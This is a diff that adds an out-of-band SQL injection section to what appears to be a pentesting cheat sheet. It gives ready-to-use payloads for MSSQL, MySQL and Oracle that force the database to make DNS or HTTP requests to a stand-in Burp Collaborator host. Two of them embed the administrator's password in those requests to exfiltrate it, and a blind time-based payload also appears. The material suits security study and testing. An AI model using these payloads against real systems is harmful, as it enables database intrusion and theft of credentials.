@@ -278,3 +278,77 @@ Data Extraction
 ```
 ' || IF (SELECT COUNT(password) FROM users WHERE username = 'administrator' AND SUBSTRING(password,1,1) > 'm') = 1 pg_sleep(5)--
 ```
+---
+
+### Out-of-Band SQL Injection (OAST)
+
+Out-of-Band SQL Injection occurs when attackers retrieve data through a different communication channel instead of the application's direct response. The database is forced to make external network requests (DNS / HTTP) to an attacker-controlled server.
+
+This technique is useful when:
+
+* The application does not return query results
+* Error-based and time-based techniques are not effective
+* The application is unstable or heavily filtered
+
+
+#### Detection
+
+OAST SQLi can be detected by triggering external interactions from the database.
+
+* Inject payloads that cause the database to make DNS or HTTP requests
+* Monitor interactions using tools like Burp Collaborator
+* If a request is received → SQLi confirmed
+
+
+#### MSSQL
+
+Trigger DNS request:
+
+```
+'; exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'--
+```
+
+
+#### MySQL
+
+```
+LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
+
+SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\\a'
+```
+
+
+#### Oracle
+
+```
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
+```
+
+
+### OAST Data Exfiltration
+
+Data can be exfiltrated by embedding query results into the external request.
+
+
+#### MSSQL
+
+```
+'; declare @p varchar(1024);
+set @p=(SELECT password FROM users WHERE username='Administrator');
+exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')--
+```
+
+
+#### Oracle
+
+```
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
+```
+
+
+### Notes
+
+* Requires external interaction monitoring (DNS / HTTP)
+* Works well in blind SQL injection scenarios
+* Useful when no response or errors are visible
+* Data is extracted via attacker-controlled server logs
